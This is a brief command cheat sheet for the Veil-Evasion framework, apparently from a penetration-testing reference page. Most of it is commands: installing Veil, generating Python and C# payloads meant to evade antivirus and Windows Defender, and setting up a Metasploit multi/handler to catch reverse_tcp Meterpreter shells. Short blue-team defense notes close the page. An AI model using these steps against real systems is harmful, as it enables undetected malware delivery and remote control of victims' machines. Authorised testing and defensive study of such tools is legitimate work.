Veil-Evasion Framework

Generate antivirus evasion payloads for authorized payload testing. Integrates with Metasploit.

Installation

sudo apt install mono-complete git
git clone https://github.com/Veil-Framework/Veil
cd Veil
./config/setup.sh --force --silent
./Veil.py

Defense: Monitor git clones of Veil-Framework, mono execution.

List Payloads

./Veil.py -l

List all available evasion payloads (python/csharp payloads).

Generate Python Payload

./Veil.py -t python -p 1 -o /tmp/veil_payload

Create ordinal python shellcode payload with LHOST/LPORT options.

Generate C# Payload

./Veil.py -t csharp -p 2

Dncshell payload – .NET shell bypassing Windows Defender.

MSF Integration

msfconsole
use multi/handler
set PAYLOAD python/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit

Listen for Veil-generated Meterpreter sessions.

Blue Team Defenses

  • Enable behavioral AV/EDR (not just signatures)
  • Monitor PowerShell/mono execution logs
  • Block unsigned .NET assembly loads
  • Network segmentation for C2 detection
